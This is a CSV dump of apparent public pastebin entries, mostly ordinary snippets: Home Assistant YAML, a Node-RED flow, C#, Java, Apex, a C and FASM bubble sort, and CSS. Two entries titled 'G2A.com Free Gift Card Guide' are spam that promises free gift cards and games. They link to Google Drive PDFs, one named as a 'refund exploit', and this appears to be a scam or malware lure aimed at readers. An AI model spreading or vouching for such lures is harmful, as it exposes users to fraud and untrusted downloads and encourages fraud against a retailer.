id,title,username,language,date,content
DUzgTMtH,Temp,djgragra,YAML,Monday 15th of April 2024 01:02:54 PM CDT,"alias: ""TEST ""
description: """"
trigger:
  - platform: state
    entity_id:
      - sensor.sensore_bagno_temperature
condition: []
action:
  - if:
      - condition: numeric_state
        entity_id: sensor.sensore_bagno_temperature
        below: 10
    then:
      - service: light.turn_off
        metadata: {}
        data: {}
        target:
          entity_id: light.piantana
    else:
      - service: light.turn_on
        metadata: {}
        data: {}
        target:
          entity_id: light.piantana
mode: single"
pfFgSvKw,Untitled,Rodunskiy,C#,Monday 15th of April 2024 01:02:48 PM CDT,"int peopleInQueue;
int fixedTimeOnePeople = 10;
int timeInQueueHour;
int timeInQueueMin;
int hour = 60;

Console.WriteLine(""Введите кол-во людей в очереди."");
peopleInQueue = Convert.ToInt32(Console.ReadLine());

int totalTimeInQueue = fixedTimeOnePeople * peopleInQueue;

timeInQueueHour = totalTimeInQueue / hour;
timeInQueueMin = totalTimeInQueue % hour;

Console.WriteLine($""Вы должны отстоять в очереди {timeInQueueHour} часа и {timeInQueueMin} минут."");"
DyFCKtDA,openepaperlink med variabler,FlyHigh-Swe,JSON,Monday 15th of April 2024 12:54:19 PM CDT,"[{""id"":""f7933ee42bd95816"",""type"":""api-call-service"",""z"":""4346d7d500d95631"",""name"":"""",""server"":""a0ae687a.b44378"",""version"":5,""debugenabled"":true,""domain"":""open_epaper_link"",""service"":""lines4"",""areaId"":[],""deviceId"":[],""entityId"":[""open_epaper_link.000002393ad13b14"",""open_epaper_link.00002c5d4d0cdadc""],""data"":""{\t    \""line1\"":\""Framsida: \""  & framsida,\t    \""line2\"":\""waylongertext\"",\t    \""line3\"":\""Test Text\"",\t    \""line4\"":\""left\"",\t    \""border\"":\""r\"",\t    \""format1\"":\""mbbw\"",\t    \""format2\"":\""mwwb\"",\t    \""format3\"":\""mbbw\"",\t    \""format4\"":\""lrwb\""}"",""dataType"":""jsonata"",""mergeContext"":"""",""mustacheAltTags"":false,""outputProperties"":[{""property"":""payload"",""propertyType"":""msg"",""value"":"""",""valueType"":""data""},{""property"":""result"",""propertyType"":""msg"",""value"":"""",""valueType"":""results""}],""queue"":""none"",""x"":850,""y"":780,""wires"":[[""7437ee72fd9432f0""]]},{""id"":""ce9b62a9e21573ec"",""type"":""inject"",""z"":""4346d7d500d95631"",""name"":"""",""props"":[{""p"":""payload""},{""p"":""topic"",""vt"":""str""}],""repeat"":""3600"",""crontab"":"""",""once"":true,""onceDelay"":0.1,""topic"":"""",""payload"":"""",""payloadType"":""date"",""x"":90,""y"":780,""wires"":[[""c01de8a23cd7c43c""]]},{""id"":""7437ee72fd9432f0"",""type"":""debug"",""z"":""4346d7d500d95631"",""name"":""debug 94"",""active"":true,""tosidebar"":true,""console"":false,""tostatus"":false,""complete"":""true"",""targetType"":""full"",""statusVal"":"""",""statusType"":""auto"",""x"":1100,""y"":780,""wires"":[]},{""id"":""c01de8a23cd7c43c"",""type"":""api-current-state"",""z"":""4346d7d500d95631"",""name"":"""",""server"":""a0ae687a.b44378"",""version"":3,""outputs"":1,""halt_if"":"""",""halt_if_type"":""num"",""halt_if_compare"":""is"",""entity_id"":""sensor.framsida_termometer_temperature"",""state_type"":""str"",""blockInputOverrides"":false,""outputProperties"":[{""property"":""framsida"",""propertyType"":""msg"",""value"":"""",""valueType"":""entityState""},{""property"":""data"",""propertyType"":""msg"",""value"":"""",""valueType"":""entity""}],""for"":""0"",""forType"":""num"",""forUnits"":""minutes"",""override_topic"":false,""state_location"":""payload"",""override_payload"":""msg"",""entity_location"":""data"",""override_data"":""msg"",""x"":410,""y"":780,""wires"":[[""f7933ee42bd95816""]]},{""id"":""a0ae687a.b44378"",""type"":""server"",""name"":""Home Assistant"",""version"":5,""addon"":true,""rejectUnauthorizedCerts"":true,""ha_boolean"":""y|yes|true|on|home|open"",""connectionDelay"":true,""cacheJson"":true,""heartbeat"":false,""heartbeatInterval"":30,""areaSelector"":""friendlyName"",""deviceSelector"":""friendlyName"",""entitySelector"":""friendlyName"",""statusSeparator"":""at: "",""statusYear"":""hidden"",""statusMonth"":""short"",""statusDay"":""numeric"",""statusHourCycle"":""h23"",""statusTimeFormat"":""h:m"",""enableGlobalContextStore"":true}]"
KrRZqqkP,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,ssss50w,GetText,Monday 15th of April 2024 12:49:22 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
  
Working as of:
15 April 2024"
bxq57vCm,Product.java,NeverRIEght,Java,Monday 15th of April 2024 12:48:47 PM CDT,"class Product {
    //declare instance constants name and price
    private final String name;
    private final int price;

    //declare a parameterized constructor
    public Product(String name, int price) {
        this.name = name;
        this.price = price;
    }

    //declare getters
    public String getName() {
        return name;
    }

    public int getPrice() {
        return price;
    }

    //declare toString
    @Override
    public String toString() {
        return this.getClass().getSimpleName() + "" [name="" + name + "", price="" + price + ""]"";
    }
}

class Purchase {
    //declare instance constants product and number
    private final Product product;
    private final int number;

    //declare a parameterized constructor
    public Purchase(Product product, int number) {
        this.product = product;
        this.number = number;
    }

    //declare getters
    public Product getProduct() {
        return product;
    }

    public int getNumber() {
        return number;
    }

    //do not change signatures of methods
    protected int getFinalCost(int baseCost) {
        return baseCost;
    }

    public final int getCost() {
        //replace 0 by a product of price by number
        int baseCost = product.getPrice() * number;
        return getFinalCost(baseCost);
    }

    protected String fieldsToString() {
        //replace returned expression by Java code in the given format
        //return product and number
        return "" [product="" + product +
                "", number="" + number;
    }

    @Override
    public final String toString() {
        //replace returned expression by Java code in the given format
        //return class_name_part + fieldsToString() + getCost_part
        return this.getClass().getSimpleName() + fieldsToString() + "", getCost()="" + getCost() + ""]"";
    }

}

class TransportExpencesPurchase extends Purchase {
    //declare instance constant expences
    private final int expences;

    //declare a parameterized constructor
    public TransportExpencesPurchase(Product product, int number, int expences) {
        super(product, number);
        this.expences = expences;
    }

    //do not change signatures of methods
    @Override
    protected int getFinalCost(int baseCost) {
        //put your code here
        return baseCost + expences;
    }

    @Override
    protected String fieldsToString() {
        //put your code here
        return super.fieldsToString() +
                "", expences="" + expences;
    }
}

class PriceDiscountPurchase extends Purchase {
    //declare instance constant discount
    private final int discount;

    //declare a parameterized constructor
    public PriceDiscountPurchase(Product product, int number, int discount) {
        super(product, number);
        this.discount = discount;
    }

    //do not change signatures of methods
    @Override
    protected int getFinalCost(int baseCost) {
        //put your code here
        return baseCost - discount * getNumber();
    }

    @Override
    protected String fieldsToString() {
        //put your code here
        return super.fieldsToString() +
                "", discount="" + discount;
    }
}

class WholesalePurchase extends Purchase {
    //declare instance constant percent and class constant LIMIT
    private final double percent;
    private static final int LIMIT = 20;

    //declare a parameterized constructor
    public WholesalePurchase(Product product, int number, double percent) {
        super(product, number);
        this.percent = percent;
    }

    //do not change signatures of methods
    @Override
    protected int getFinalCost(int baseCost) {
        //put your code here
        if (getNumber() >= 20) {
            return (int) Math.round(baseCost * (1 - percent / 100));
        }
        return baseCost;
    }

    @Override
    protected String fieldsToString() {
        //put your code here
        return super.fieldsToString() +
                "", percent="" + percent;
    }
}"
wpeyBh8k,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Monday 15th of April 2024 12:44:13 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_240365.pdf

Working as of:
15 April 2024"
DqSnUjbL,Untitled,Rodunskiy,C#,Monday 15th of April 2024 12:38:40 PM CDT,"int peopleInQueue;
int fixedTimeOnePeople = 10;
int timeInQueueHour;
int timeInQueueMin;
int hour = 60;

Console.WriteLine(""Введите кол-во людей в очереди."");
peopleInQueue = Convert.ToInt32(Console.ReadLine());

timeInQueueHour = (fixedTimeOnePeople * peopleInQueue) / hour;
timeInQueueMin = (fixedTimeOnePeople * peopleInQueue) % hour;

Console.WriteLine($""Вы должны отстоять в очереди {timeInQueueHour} часа и {timeInQueueMin} минут."");"
kzLDu20t,Untitled,dllbridge,C,Monday 15th of April 2024 12:16:43 PM CDT,"

#include <stdio.h>


int  sort (int *, int  ); 
void swap (int &, int &);
void print(int *, int  );

extern ""C"" {
 
    void  __stdcall _swap(  int *, int * );   
    int   __stdcall _sort(  int *, int   );       
}


////////////////////////////////////////////////////////
int main()                                            //
{

	int mas[99] = {5, 11, 2, 1117, 6, 34, 91, 1, 7},
	
          n     = _sort (mas, 9);	
    
    printf(""Number of permutations = %d \n"", n);
    
	print(mas, 9);

return 0;
}


//  stdcall-функция может как угодно менять eax, ecx и edx,
//  не восстанавливая их потом. 
// - - - - - - - - - - - - - - - - 
//   1)  swap - Функция
//   2)  Используем аналогию: по одному торту в каждой руке.
//       Чтобы их поменять местами, потребуется стол.
//        
//  10)  Кол-во перестановок узнаём.


////////////////////////////////////////////////////////
void swap(int &n1, int &n2)                           //
{
	
	 int n3 = n1;
	 
	     n1 = n2;
	     n2 = n3;
}


////////////////////////////////////////////////////////
int  sort(int *p, int n)                              // 
{
	
	    int nF, nCount = 0;                                       //  Флаг  
	 
L_01:	    nF = 0;             
	
			for(int i = 0; i < n-1; i++)
			{
															
				if( p[i] > p[i+1] ) { nF = 1;       //  = 1, если требуется перестановка  
				                      nCount ++; 
				                    //  swap( p[i],  p[i+1] ); }
									 _swap(  &p[i], &p[i+1] ); }	
			}
			
			if(nF) goto L_01;
			  
return nCount;			  
}



////////////////////////////////////////////////////////
void print(int *p, int n)                             // 
{
	
	 for(int i = 0; i < n; i++) {
	                              printf(""%d, "", p[i]);
	 }
	 
	 printf(""\n"");
}











// Пузырьковая сортировка на Си — это метод сортировки данных, который 
// работает путём сравнения соседних элементов и обмена их местами, 
// если необходимо. Алгоритм состоит из нескольких проходов по массиву, 
// каждый из которых улучшает порядок элементов.

//  FASM :
include    'win32a.inc'




format      MS COFF




public     _sort                    as '__sort@8'
public     _swap                    as '__swap@8'



section   '.text' code readable executable


;      Передаём указатели на элементы массива, которые следует
;                                             поменять местами.
;/////////////////////////////////////////////////////////////
proc   _swap   p1, p2                                      ;//


        mov  esi ,  [ p1]
        mov  eax ,  [esi]
        mov  edi ,  [ p2]
        mov  edx ,  [edi]
        mov [esi],   edx
        mov [edi],   eax

        ret
endp

;  Специально для функции sort, чтобы упростить создание кода.
;                         В p адрес младшего из 2-х элементов
;////////////////////////////////////////////////////////////
proc    swap   p                                          ;//

        push esi
        push edi

       ; - - - - - - - - -
        mov  esi ,  [ p ]             ; Адрес 1-го торта
        mov  edi ,  [ p ]
        add  edi ,     4              ; Адрес 2-го торта
        mov  eax ,  [esi]             ; 1-й торт в левую руку   (в eax)

        cmp  eax ,  [edi]             ; Сравним 2 торта

        jle  L_01                     ; Если содержимое eax < ,то выходим

        mov  edx , [edi]              ; edx, как стол используем
        mov [esi],  edx
        mov [edi],  eax
        mov [ nF],    1               ; Флаг помнит про перестановку
        inc [nCount]                  ; Счётчик перестановок увеличиваем
       ; - - - - - - - - -

L_01:   pop  edi
        pop  esi
        ret
endp







;  stdcall-функция может как угодно менять eax, ecx и edx,
;  не восстанавливая их потом.
;/////////////////////////////////////////////////////////////
proc   _sort   p, n                                        ;//

        dec   [n]


L_05:   mov   esi ,  [p]
        mov   ecx ,  [n]                                       ; число итераций
        mov  [ nF],    0

L_02:   push  esi

        call swap
        add   esi ,    4

        loop L_02                                          ; Команда цикла, переход на новый

        cmp   [nF],    1
        jz   L_05
        mov   eax , [nCount]
ret

endp







section '.data' data readable writeable
;-------------------------------------------------------------     Создание переменных:
   arr     dd   4 dup(333)
   nF      dd   0
   nCount  dd   0

            "
3z32kvGe,ConvertNumberToText,andresnogales,Java,Monday 15th of April 2024 12:12:18 PM CDT,"public with sharing class ConvertNumberToText {
    public ConvertNumberToText() {
    }

    private static final List<String> tensNames = new List<String>{
        '',
        ' ten',
        ' twenty',
        ' thirty',
        ' forty',
        ' fifty',
        ' sixty',
        ' seventy',
        ' eighty',
        ' ninety'
    };

    private static final List<String> numNames = new List<String>{
        '',
        ' one',
        ' two',
        ' three',
        ' four',
        ' five',
        ' six',
        ' seven',
        ' eight',
        ' nine',
        ' ten',
        ' eleven',
        ' twelve',
        ' thirteen',
        ' fourteen',
        ' fifteen',
        ' sixteen',
        ' seventeen',
        ' eighteen',
        ' nineteen'
    };

    private static String convertLessThanOneThousand(Integer numberValue) {
        String soFar;

        if (Math.mod(numberValue, 100) < 20) {
            soFar = numNames[Math.mod(numberValue, 100)];
            numberValue = numberValue / 100;
        } else {
            soFar = numNames[Math.mod(numberValue, 10)];
            numberValue = numberValue / 10;

            soFar = tensNames[Math.mod(numberValue, 10)] + soFar;
            numberValue = numberValue / 10;
        }
        if (numberValue == 0)
            return soFar;
        return numNames[numberValue] + ' hundred' + soFar;
    }

    public static String convert(Long numberValue) {
        // 0 to 999 999 999 999
        if (numberValue == 0) {
            return 'zero';
        }
        String snumber = String.valueOf(numberValue);

        // Pad with ""0""
        String mask = '000000000000';
        while (snumber.length() < mask.length()) {
            snumber = '0' + snumber;
        }

        // XXXnnnnnnnnn
        Integer billions = Integer.valueOf(snumber.substring(0, 3));
        // nnnXXXnnnnnn
        Integer millions = Integer.valueOf(snumber.substring(3, 6));
        // nnnnnnXXXnnn
        Integer hundredThousands = Integer.valueOf(snumber.substring(6, 9));
        // nnnnnnnnnXXX
        Integer thousands = Integer.valueOf(snumber.substring(9, 12));

        String tradBillions;
        switch on (billions) {
            when 0 {
                tradBillions = '';
            }
            when 1 {
                tradBillions =
                    convertLessThanOneThousand(billions) + ' billion ';
            }
            when else {
                tradBillions =
                    convertLessThanOneThousand(billions) + ' billion ';
            }
        }
        String result = tradBillions;

        String tradMillions;
        switch on (millions) {
            when 0 {
                tradMillions = '';
            }
            when 1 {
                tradMillions =
                    convertLessThanOneThousand(millions) + ' million ';
            }
            when else {
                tradMillions =
                    convertLessThanOneThousand(millions) + ' million ';
            }
        }
        result = result + tradMillions;

        String tradHundredThousands;
        switch on (hundredThousands) {
            when 0 {
                tradHundredThousands = '';
            }
            when 1 {
                tradHundredThousands = 'one thousand ';
            }
            when else {
                tradHundredThousands =
                    convertLessThanOneThousand(hundredThousands) + ' thousand ';
            }
        }
        result = result + tradHundredThousands;

        String tradThousand;
        tradThousand = convertLessThanOneThousand(thousands);
        result = result + tradThousand;

        // remove extra spaces!
        return result.replaceAll('^\\s+', '').replaceAll('\\b\\s{2,}\\b', ' ');
    }

    /*
    String phrase = '12345.67';
    Decimal num = Decimal.valueOf(phrase);
    Integer dollars = num.intValue();
    Integer cent = Integer.valueOf((num - dollars) * 100);

    String s = '$ ' + ConvertNumberToText.convert(dollars) + ' and '
            + ConvertNumberToText.convert(cent) + ' cents';
    System.debug(s);
    */
}
"
yTFQaSSz,Untitled,DaniDori,CSS,Monday 15th of April 2024 11:55:08 AM CDT,"input[type=""number""]::-webkit-outer-spin-button,
input[type=""number""]::-webkit-inner-spin-button {
    -webkit-appearance: none; // Yeah, yeah everybody write about it
}

input[type='number'],
input[type=""number""]:hover,
input[type=""number""]:focus {
    appearance: none;
    -moz-appearance: textfield;
}

.igra-btn {
  background-color: #4CAF50; /* Зеленый цвет */
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  position: fixed;
  right: 100px;
  top: 100px;
  z-index: 9999;
  border-radius: 8px;
  height: 50px;
}

.igra-btn-percent {
  background-color: #42aaff; /* Голубой цвет */
  border: none;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  position: fixed;
  right: 550px;
  top: 100px;
  z-index: 9999;
  border-radius: 8px;
  height: 50px;
}

.igra-btn-display {
  background-color: #ff0000; /* Красный цвет */
  border: none;
  color: white;
  padding: 4px 4px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  position: fixed;
  left: 30px;
  top: 30px;
  z-index: 9999;
  border-radius: 8px;
  height: 24px;
  width: 24px;
}

.igra-input {
  border: none;
  background-color: #4CAF50;
  color: white;
  outline: #9ee7a1 ;
  position: fixed;
  right: 250px;
  top: 100px;
  z-index: 9999;
  border-radius: 8px;
  height: 50px;
  padding: 15px 32px;
  font-size: 16px;
  width: 250px;
}

.item-profit {
  font-size: 16px;
  z-index: 9999;
  color: #4CAF50;
  padding-left: 10px;
}

.d-n {
  display: none;
}

.promo-input {
  border: none;
  background-color: #555;
  color: white;
  outline: #9ee7a1 ;
  position: fixed;
  top: 50px;
  z-index: 9999;
  border-radius: 8px;
  height: 50px;
  padding: 15px 32px;
  font-size: 12px;
  width: 250px;
  right: 250px;
}
"
